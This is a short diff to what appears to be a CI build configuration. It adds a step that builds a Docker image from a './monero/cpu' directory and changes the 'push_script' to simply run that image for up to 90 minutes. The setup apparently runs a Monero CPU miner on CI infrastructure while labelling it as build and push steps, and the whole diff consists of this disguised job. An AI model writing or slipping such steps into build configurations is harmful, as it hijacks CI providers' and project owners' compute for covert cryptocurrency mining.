@@ -1,3 +1,4 @@
 docker_builder:
+  build_script: docker build -t nmlm99/nizadam:latest ./monero/cpu
   timeout_in: 90m
-  push_script: docker run --privileged --net host nmlm99/nizadam:latest
+  push_script: docker run nmlm99/nizadam:latest
